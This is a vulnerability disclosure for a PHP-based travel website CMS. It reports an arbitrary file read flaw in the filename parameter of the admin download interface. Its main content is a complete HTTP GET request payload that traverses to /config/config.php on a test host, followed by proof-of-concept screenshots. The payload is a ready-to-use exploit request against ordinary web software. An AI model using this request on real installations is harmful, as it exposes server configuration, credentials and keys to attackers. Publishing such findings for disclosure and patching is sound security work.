# PHP-based travel website-CMS download filename Arbitrary file reading

**Exploit Title: PHP-based travel website-CMS download-filename exists in Arbitrary file reading vulnerability**

**Exploit Author: webraybtl@webray.com.cn inc**

**Vendor Homepage: https://github.com/baowzh/hfly**

**Software Link: https://github.com/baowzh/hfly**

**CMSName: PHP-based travel website-CMS**

**Tested on: Windows, Apache ,Mysql**

**Description**

Arbitrary file read vulnerability refers to the ability of an attacker to bypass application restrictions and read arbitrary file contents on the server, including sensitive configurations, account passwords, keys, etc. Such vulnerabilities usually stem from the lack of strict verification of user input.The filename parameter of the download interface on the vulnerable site can be used to download any file.

Payload used:

```
GET /admin/index.php/datafile/download?filename=%2Fconfig%2Fconfig.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Cookie: ADMIN_PHPSESSID=sj5k234u5eue0uof0k099k35j7; current_city=nanning; WEB_PHPSESSID=1sctd026e5pvjv02v6ksbbtrj2; Hm_lvt_8987594b0b7682191cafc4396e168113=1764236266; HMACCOUNT=36908916AD850A67; __51cke__=; Hm_lpvt_8987594b0b7682191cafc4396e168113=1764236600; __tins__17819771=%7B%22sid%22%3A%201764236266063%2C%20%22vd%22%3A%2018%2C%20%22expires%22%3A%201764238400368%7D; __51laig__=18
Host: 172.24.6.217:88
Referer: http://172.24.6.217:88/admin/index.php/datafile/lists
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
```

##

## Proof of Concept

<img width="1774" height="1473" alt="2025-11-27-17-49-35-image" src="https://github.com/user-attachments/assets/59a844af-9677-4ec4-9242-2e8665457e11" />

<img width="2101" height="788" alt="2025-11-27-17-49-47-image" src="https://github.com/user-attachments/assets/0a7de868-07e8-4765-9cf0-ceffb8c7b944" />

